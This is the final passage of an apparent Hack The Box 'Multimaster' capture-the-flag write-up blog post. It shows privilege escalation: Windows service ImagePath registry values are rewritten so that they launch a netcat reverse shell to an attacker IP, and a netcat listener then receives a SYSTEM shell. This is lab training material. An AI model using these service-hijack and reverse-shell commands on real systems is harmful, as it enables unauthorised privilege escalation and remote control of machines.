+[SC] StartService FAILED 1053:
+
+The service did not respond to the start or control request in a timely fashion.
+
+*Evil-WinRM* PS C:\Users\jorden\Documents&gt; REG add HKLM\System\CurrentControlSet\Services\wbengine /v ImagePath /t REG_EXPAND_SZ /d "cmd.exe /c C:\Users\jorden\Documents\nc.exe 10.10.15.57 12345 -e cmd.exe" /f
+The operation completed successfully.
+
+*Evil-WinRM* PS C:\Users\jorden\Documents&gt; sc.exe start wbengine
+[SC] StartService: OpenService FAILED 1060:
+
+The specified service does not exist as an installed service.
+
+*Evil-WinRM* PS C:\Users\jorden\Documents&gt; REG add HKLM\System\CurrentControlSet\Services\VSS /v ImagePath /t REG_EXPAND_SZ /d "cmd.exe /c C:\Users\jorden\Documents\nc.exe 10.10.15.57 12345 -e cmd.exe" /fThe operation completed successfully.
+
+*Evil-WinRM* PS C:\Users\jorden\Documents&gt; sc.exe start VSS
+[SC] StartService FAILED 1053:
+
+The service did not respond to the start or control request in a timely fashion.
+</pre></table></code></div></div><p>I had to try many services until I found one that would work. Even then, it said it failed to start the service, but I got my shell!</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+</pre><td class="rouge-code"><pre>zweilos@kalimaa:~/htb/multimaster$ nc -lvnp 12345
+listening on [any] 12345 ...
+connect to [10.10.15.57] from (UNKNOWN) [10.10.10.179] 49763
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32&gt;whoami /all
+whoami /all
+
+USER INFORMATION
+----------------
+
+User Name           SID     
+=================== ========
+nt authority\system S-1-5-18
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                 Type             SID                                                             Attributes                                        
+========================================== ================ =============================================================== ==================================================
+Mandatory Label\System Mandatory Level     Label            S-1-16-16384                                                                                                      
+Everyone                                   Well-known group S-1-1-0                                                         Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                                    Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                              Alias            S-1-5-32-545                                                    Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\SERVICE                       Well-known group S-1-5-6                                                         Mandatory group, Enabled by default, Enabled group
+CONSOLE LOGON                              Well-known group S-1-2-1                                                         Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                                        Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization             Well-known group S-1-5-15                                                        Mandatory group, Enabled by default, Enabled group
+NT SERVICE\VSS                             Well-known group S-1-5-80-3195062495-2862850656-3724129271-1847284719-4038691091 Enabled by default, Enabled group, Group owner    
+LOCAL                                      Well-known group S-1-2-0                                                         Mandatory group, Enabled by default, Enabled group
+BUILTIN\Administrators                     Alias            S-1-5-32-544                                                    Enabled by default, Enabled group, Group owner    
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                            Description                                                        State   
+========================================= ================================================================== ========
+SeAssignPrimaryTokenPrivilege             Replace a process level token                                      Disabled
+SeLockMemoryPrivilege                     Lock pages in memory                                               Enabled 
+SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
+SeTcbPrivilege                            Act as part of the operating system                                Enabled 
+SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
+SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
+SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
+SeSystemProfilePrivilege                  Profile system performance                                         Enabled 
+SeSystemtimePrivilege                     Change the system time                                             Disabled
+SeProfileSingleProcessPrivilege           Profile single process                                             Enabled 
+SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled 
+SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled 
+SeCreatePermanentPrivilege                Create permanent shared objects                                    Enabled 
+SeBackupPrivilege                         Back up files and directories                                      Disabled
+SeRestorePrivilege                        Restore files and directories                                      Disabled
+SeShutdownPrivilege                       Shut down the system                                               Disabled
+SeDebugPrivilege                          Debug programs                                                     Enabled 
+SeAuditPrivilege                          Generate security audits                                           Enabled 
+SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
+SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled 
+SeUndockPrivilege                         Remove computer from docking station                               Disabled
+SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled
+SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled 
+SeCreateGlobalPrivilege                   Create global objects                                              Enabled 
+SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled 
+SeTimeZonePrivilege                       Change the time zone                                               Enabled 
+SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled 
+SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled 
+
+ERROR: Unable to get user claims information.
+
+C:\Windows\system32&gt;
+</pre></table></code></div></div><p>The process of replicating changes in one master copy of the account database to all other master copies is called a multimaster operation.</p><p>limbernie</p><h3 id="finale">Finale</h3><p>MinatoTW &amp; egre55 Thanks to <a href="https://www.hackthebox.eu/home/users/profile/&lt;profile_num&gt;"><code class="language-plaintext highlighter-rouge">&lt;box_creator&gt;</code></a> for .</p><p>If you have comments, issues, or other feedback, or have any other fun or useful tips or tricks to share, feel free to contact me on Github at <a href="https://github.com/zweilosec">https://github.com/zweilosec</a> or in the comments below!</p><p>If you like this content and would like to see more, please consider buying me a coffee! <a href="https://www.buymeacoffee.com/zweilosec"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://img.buymeacoffee.com/button-api/?text=Buy me a coffee&amp;emoji=&amp;slug=zweilosec&amp;button_colour=FFDD00&amp;font_colour=000000&amp;font_family=Lato&amp;outline_colour=000000&amp;coffee_colour=ffffff" /></a></p></div><script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="zweilosec" data-description="Support me on Buy me a coffee!" data-message="If you like this content and would like to see more, please consider buying me a coffee!" data-color="#FFDD00" data-position="Right" data-x_margin="18" data-y_margin="18"></script><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hack-the-box/'>Hack the Box</a>, <a href='/categories/writeup/'>Writeup</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/htb/" class="post-tag no-text-decoration" >htb</a> <a href="/tags/hacking/" class="post-tag no-text-decoration" >hacking</a> <a href="/tags/hack-the-box/" class="post-tag no-text-decoration" >hack the box</a> <a href="/tags/redteam/" class="post-tag no-text-decoration" >redteam</a> <a href="/tags/windows/" class="post-tag no-text-decoration" >windows</a> <a href="/tags/powershell/" class="post-tag no-text-decoration" >powershell</a> <a href="/tags/web/" class="post-tag no-text-decoration" >web</a> <a href="/tags/unicode/" class="post-tag no-text-decoration" >unicode</a> <a href="/tags/waf/" class="post-tag no-text-decoration" >waf</a> <a href="/tags/python/" class="post-tag no-text-decoration" >python</a> <a href="/tags/vscode/" class="post-tag no-text-decoration" >vscode</a> <a href="/tags/sebackupprivilege/" class="post-tag no-text-decoration" >sebackupprivilege</a> <a href="/tags/serestoreprivilege/" class="post-tag no-text-decoration" >serestoreprivilege</a> <a href="/tags/insane/" class="post-tag no-text-decoration" >insane</a> <a href="/tags/writeup/" class="post-tag no-text-decoration" >writeup</a> <a href="/tags/minatotw/" class="post-tag no-text-decoration" >minatotw</a> <a href="/tags/egre55/" class="post-tag no-text-decoration" >egre55</a> <a href="/tags/unfinished/" class="post-tag no-text-decoration" >unfinished</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hack the Box - Multimaster Writeup - Hacker's Rest&url=https://zweilosec.github.io/posts/multimaster/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hack the Box - Multimaster Writeup - Hacker's Rest&u=https://zweilosec.github.io/posts/multimaster/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Hack the Box - Multimaster Writeup - Hacker's Rest&url=https://zweilosec.github.io/posts/multimaster/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/upgrade-linux-shell/">Upgrade a linux reverse shell to a fully usable TTY shell</a><li><a href="/posts/late/">Hack The Box - Late Writeup</a><li><a href="/posts/acute/">Hack The Box - Acute Writeup</a><li><a href="/posts/jekyll-chirpy-github-pages-blog/">How to use GitHub Pages to host a blog with Jekyll Chirpy theme</a><li><a href="/posts/zip-unzip-files-powershell/">How to Zip and Unzip Files Using PowerShell</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/hacking/">hacking</a> <a class="post-tag" href="/tags/hack-the-box/">hack the box</a> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/redteam/">redteam</a> <a class="post-tag" href="/tags/writeup/">writeup</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/unfinished/">unfinished</a> <a class="post-tag" href="/tags/oscp/">oscp</a> <a class="post-tag" href="/tags/tj-null/">tj_null</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <script src="https://utteranc.es/client.js" repo="zweilosec/zweilosec.github.io" issue-term="title" label="comments 💬" theme="github-dark" crossorigin="anonymous" async> </script><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/resolute/"><div class="card-body"> <span class="timeago small" > May 24, 2020 <i class="unloaded">2020-05-24T14:00:00+00:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack the Box - Resolute Writeup</h3><div class="text-muted small"><p> HTB - Resolute Overview A medium-difficulty Windows box that was fairly straightforward. Privilege escalation required going through two different users and taking advantage of Windows domain ...</p></div></div></a></div><div class="card"> <a href="/posts/sauna/"><div class="card-body"> <span class="timeago small" > Jun 3, 2020 <i class="unloaded">2020-06-03T14:00:00+00:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack the Box - Sauna Writeup</h3><div class="text-muted small"><p> HTB - Sauna Overview A fairly easy Windows machine that requires a little ‘outside the box’ thinking in order to get the initial foothold. After that, simple enumeration will give everything e...</p></div></div></a></div><div class="card"> <a href="/posts/blunder/"><div class="card-body"> <span class="timeago small" > Jun 9, 2020 <i class="unloaded">2020-06-09T14:00:00+00:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack the Box - Blunder Writeup</h3><div class="text-muted small"><p> HTB - Blunder Overview This easy difficulty Linux machine featured a content management system that was new to me, and a simple to use but interesting way to bypass a common configuration used ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/remote/" class="btn btn-outline-primary" prompt="Older"><p>Hack the Box - Remote Writeup</p></a> <a href="/posts/cascade/" class="btn btn-outline-primary" prompt="Newer"><p>Hack the Box - Cascade Writeup</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://twitter.com/zweilosec">zweilosec</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/hacking/">hacking</a> <a class="post-tag" href="/tags/hack-the-box/">hack the box</a> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/redteam/">redteam</a> <a class="post-tag" href="/tags/writeup/">writeup</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/unfinished/">unfinished</a> <a class="post-tag" href="/tags/oscp/">oscp</a> <a class="post-tag" href="/tags/tj-null/">tj_null</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://zweilosec.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script>
